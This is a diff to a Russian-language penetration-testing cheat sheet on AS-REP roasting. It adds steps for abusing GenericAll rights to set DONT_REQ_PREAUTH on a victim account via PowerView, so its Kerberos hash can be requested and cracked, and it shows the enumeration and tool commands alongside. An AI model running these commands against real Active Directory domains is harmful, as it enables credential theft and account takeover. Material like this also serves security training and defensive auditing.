@@ -25,6 +25,16 @@
 ```powershell
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
 ```
+
+---
+Если мы обнаружим, что у нас есть `GenericAll` привилегии для учетной записи, то вместо сброса пароля учетной записи мы можем включить `DONT_REQ_PREAUTH` флаг, чтобы отправить запрос на получение хэша этой учетной записи и попытаться взломать ее. Для этого можно использовать модуль PowerView (не забудьте заменить «userName» на фактическое имя пользователя учетной записи жертвы):
+
+#### Установите DONT_REQ_PREAUTH с помощью PowerView
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1 PS C:\Tools> Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
 ### Инструменты:
 
 1)  [Rubeus](https://github.com/SkillfactoryCoding/HACKER-OS-Rubeus) (модуль [asreproast](https://github.com/SkillfactoryCoding/HACKER-OS-Rubeus/blob/master/Rubeus/Commands/Asreproast.cs)) — получение хеша пользователя.
